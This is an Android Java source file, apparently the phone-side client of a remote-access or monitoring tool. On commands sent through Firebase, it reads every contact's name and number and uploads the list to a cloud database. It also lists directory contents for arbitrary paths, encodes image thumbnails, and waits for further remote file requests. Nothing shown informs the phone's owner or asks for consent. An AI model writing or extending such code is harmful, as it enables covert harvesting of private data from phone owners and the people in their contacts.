package com.lyrnic.userside.services;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Handler;
import android.provider.ContactsContract;
import android.util.Base64;
import android.util.Log;
import android.webkit.MimeTypeMap;

import androidx.annotation.NonNull;
import androidx.concurrent.futures.CallbackToFutureAdapter;
import androidx.work.ListenableWorker;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.common.util.concurrent.ListenableFuture;
import com.google.firebase.firestore.DocumentChange;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.ListenerRegistration;
import com.lyrnic.userside.constants.Actions;
import com.lyrnic.userside.constants.Constants;
import com.lyrnic.userside.firebase.FirebaseActionsReceiver;
import com.lyrnic.userside.model.Contact;
import com.lyrnic.userside.network.ApiClient;
import com.lyrnic.userside.utilities.DevicesUtilities;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.HashSet;


public class ActionsWorker extends ListenableWorker  {
    ArrayList<Contact> contactList = new ArrayList<>();
    long lastUpdate = 0;
    boolean returnResult;
    ListenerRegistration listener;
    MyCallback callback;
    boolean success;
    private static final String[] PROJECTION = new String[]{
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
    };
    boolean listening;
    public ActionsWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public ListenableFuture<Result> startWork() {
        return CallbackToFutureAdapter.getFuture(completer -> {
            callback = new MyCallback() {
                @Override
                public void onSuccess() {
                    completer.set(Result.success());
                }

                @Override
                public void onError() {
                    completer.set(Result.retry());
                }
            };

            start();
            return callback;
        });
    }
    public void start(){
        String action = getInputData().getString(Constants.DATA_ACTION_KEY);

        if (action == null) {
            callback.onError();
        }
        String token = getInputData().getString(Constants.DEVICE_TOKEN_KEY);
        switch (action) {
            case Actions.ACTION_GET_CONTACTS:
                try {
                    getContacts();
                    lastUpdate = System.currentTimeMillis();
                } catch (JSONException e) {
                    e.printStackTrace();
                    returnResult = true;
                }
                break;
            case Actions.ACTION_GET_FILE_TREE:
                String exists = getInputData().getString(Constants.DATA_PATH_EXISTS_KEY);
                String path = getInputData().getString(Constants.DATA_PATH_KEY);

                ApiClient.pushAction(getApplicationContext(), Actions.ACTION_GET_FILE_TREE, token, exists);

                try {
                    getFileTree(path);
                } catch (JSONException e) {
                    e.printStackTrace();
                    returnResult = true;
                }
                break;
            case Actions.ACTION_GET_STATE:
                ApiClient.pushAction(getApplicationContext(), Actions.ACTION_GET_STATE,getInputData().getString(Constants.DATA_DEVICE_TOKEN_KEY));
                callback.onSuccess();
                return;
        }

        Handler handler = new Handler();

        handler.post(new Runnable() {
            @Override
            public void run() {
                if(System.currentTimeMillis() - lastUpdate > 60000){
                    returnResult = true;

                    if(listener != null){
                        listener.remove();

                    }
                    if (success) {
                        callback.onSuccess();
                    } else {
                        callback.onError();
                    }
                }
                if(!returnResult){
                    handler.postDelayed(this,1000);
                }
            }
        });

    }


    public void getFileTree(String path) throws JSONException {
        String fileTree = pathToFileTreeJsonString(path);

        updateDeviceWithFileTree(fileTree);
    }

    public void updateDeviceWithFileTree(String fileTree) {
        FirebaseFirestore db = FirebaseFirestore.getInstance();

        db.collection(Constants.DEVICES_COLLECTION_NAME)
                .document(DevicesUtilities.getDeviceDocumentId(getApplicationContext()))
                .update(Constants.DEVICE_FILES_ACTIONS_KEY, fileTree).addOnCompleteListener((task -> {
                    if (task.isSuccessful()) {
                        if(!listening){
                            listenOnFileTreeRequests();
                        }

                    }
                }));
    }
    public String pathToFileTreeJsonStringWithImageFilesThumbnails(String path) throws JSONException {
        File[] files = new File(path).listFiles();
        if (files == null) {
            return null;
        }
        JSONObject jsonFileTree = new JSONObject();
        for (File file : files) {
            if(!file.isDirectory()){
                String mimeType = getMimeType(file);
                if(mimeType == null){
                    jsonFileTree.put(file.getName(), "false");
                    continue;
                }
                String type = mimeType.split("/")[0];
                if(type.equals("image")){
                    JSONObject imageData = new JSONObject();
                    imageData.put("image_data",imageToString(file));

                    jsonFileTree.put(file.getName(), imageData);
                }
                else{
                    jsonFileTree.put(file.getName(), "false");
                }
            }
            else{
                jsonFileTree.put(file.getName(), "true");
            }

        }
        return jsonFileTree.toString();
    }

    public void listenOnFileTreeRequests() {
        listening = true;
        FirebaseFirestore db = FirebaseFirestore.getInstance();

        String exists = getInputData().getString(Constants.DATA_PATH_EXISTS_KEY);

        if(!Boolean.parseBoolean(exists)){
            return;
        }

        listener = db.collection(Constants.DEVICES_COLLECTION_NAME)
                .whereEqualTo(Constants.DEVICE_TOKEN_KEY, FirebaseActionsReceiver.getToken(getApplicationContext()))
                .addSnapshotListener(((value, error) -> {
                    if (value == null || error != null) {
                        success = false;
                        return;
                    }
                    lastUpdate = System.currentTimeMillis();
                    success = true;

                    for (DocumentChange dc : value.getDocumentChanges()) {
                        if (dc.getType().equals(DocumentChange.Type.MODIFIED)) {
                            Log.d("Document changes", "Modified document: " + dc.getDocument().getData());
                            String[] request = dc.getDocument().getString(Constants.DEVICE_FILES_ACTIONS_KEY).split(" ");
                            if(request.length > 1){
                                String method = request[0];
                                String path = new String(Base64.decode(request[1],Base64.DEFAULT));
                                switch (method){
                                    case Actions.REQUEST_METHOD_GET:
                                        try {
                                            getFileTree(path);
                                        } catch (JSONException e) {
                                            throw new RuntimeException(e);
                                        }
                                        break;
                                    case Actions.REQUEST_METHOD_RENAME:

                                        break;
                                    case Actions.REQUEST_METHOD_COPY:

                                        break;
                                    case Actions.REQUEST_METHOD_CUT:

                                        break;
                                    case Actions.REQUEST_METHOD_REMOVE:

                                        break;
                                }
                            }
                        }
                    }

                }));
    }

    public String pathToFileTreeJsonString(String path) throws JSONException {
        File[] files = new File(path).listFiles();
        if (files == null) {
            return null;
        }

        JSONObject jsonFileTree = new JSONObject();
        for (File file : files) {
            jsonFileTree.put(file.getName(), String.valueOf(file.isDirectory()));
        }
        return jsonFileTree.toString();
    }
    public String contactsToJsonString() throws JSONException {
        JSONObject jsonFileTree = new JSONObject();
        for (Contact contact: contactList) {
            jsonFileTree.put(contact.getName(), contact.getPhoneNumber());
        }
        return jsonFileTree.toString();
    }
    public String imageToString(File file){
        Bitmap image = BitmapFactory.decodeFile(file.getAbsolutePath());

        int newWidth = 60; // Example width
        int newHeight = 70; // Example height

        Bitmap resizedBitmap = Bitmap.createScaledBitmap(image, newWidth, newHeight, true);


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 50, byteArrayOutputStream);

        byte[] byteArray = byteArrayOutputStream.toByteArray();

        return Base64.encodeToString(byteArray, Base64.DEFAULT);
    }

    public String getMimeType(File file){
        Uri uri = Uri.fromFile(file);
        String mimeType = null;
        if (ContentResolver.SCHEME_CONTENT.equals(uri.getScheme())) {
            ContentResolver cr = getApplicationContext().getContentResolver();
            mimeType = cr.getType(uri);
        } else {
            String fileExtension = MimeTypeMap.getFileExtensionFromUrl(uri
                    .toString());
            mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(
                    fileExtension.toLowerCase());
        }
        return mimeType;
    }


    public void updateDeviceWithContactsList(String contactsJSON) {
        FirebaseFirestore db = FirebaseFirestore.getInstance();

        db.collection(Constants.DEVICES_COLLECTION_NAME)
                .document(DevicesUtilities.getDeviceDocumentId(getApplicationContext()))
                .update(Constants.DEVICE_CONTACTS_KEY, contactsJSON).addOnCompleteListener((task -> {
                    if (task.isSuccessful()) {
                        success = true;
                        ApiClient.pushAction(getApplicationContext(), Actions.ACTION_GET_CONTACTS,getInputData().getString(Constants.DEVICE_TOKEN_KEY));
                        Log.d("FCM","contacts uploaded successfully");
                        returnResult = true;
                    }
                }));
    }
    public void getContacts() throws JSONException {
        getContactList();

        updateDeviceWithContactsList(contactsToJsonString());
    }
    private void getContactList() {
        ContentResolver cr = getApplicationContext().getContentResolver();

        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PROJECTION, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
        if (cursor != null) {
            HashSet<String> mobileNoSet = new HashSet<String>();
            try {
                final int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                final int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                String name, number;
                while (cursor.moveToNext()) {
                    name = cursor.getString(nameIndex);
                    number = cursor.getString(numberIndex);
                    number = number.replace(" ", "");
                    if (!mobileNoSet.contains(number)) {
                        contactList.add(new Contact(name, number));
                        mobileNoSet.add(number);
                        Log.d("hvy", "onCreate View  Phone Number: name = " + name
                                + " No = " + number);
                    }
                }
            } finally {
                cursor.close();
            }
        }
    }
    interface MyCallback {
        void onSuccess();
        void onError();
    }
}
